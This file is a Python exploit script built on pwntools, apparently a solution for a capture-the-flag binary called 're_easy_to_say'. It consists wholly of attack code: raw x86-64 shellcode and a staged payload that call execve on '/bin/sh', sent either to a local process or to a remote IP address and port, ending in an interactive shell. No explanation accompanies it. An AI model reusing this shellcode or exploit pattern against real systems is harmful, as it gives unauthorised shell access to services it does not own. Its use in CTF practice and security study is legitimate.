import pwn
import pwnlib

pwn.context.clear(arch='amd64')
pwn.context.terminal = ['tmux', 'splitw', '-h']

payload = "\xB2\x3B\x54\x5E\x0F\x05\xCD\x80"
payload2 = '/bin/sh\x00' + 'x'*(0x3b-8)
shellcode = "\xB3\x02\x49\xBC\x2D\x62\x69\x6E\x2F\x73\x68\x00\x4C\x01\xE3\x53\x48\x8D\x3C\x24\xB0\x3B\x0F\x05"

if __name__ == '__main__':
    if pwnlib.args.args['REMOTE']:
        p = pwn.connect('52.69.40.204', 8361)
    else:
        p = pwn.process('./re_easy_to_say-4d171ed2949ad2e9fcb5350c71aa80ec')

    pwn.gdb.attach(p)
    raw_input()
    p.sendafter('Give me your code :', payload)
    raw_input()
    p.send(payload2)
    p.interactive()
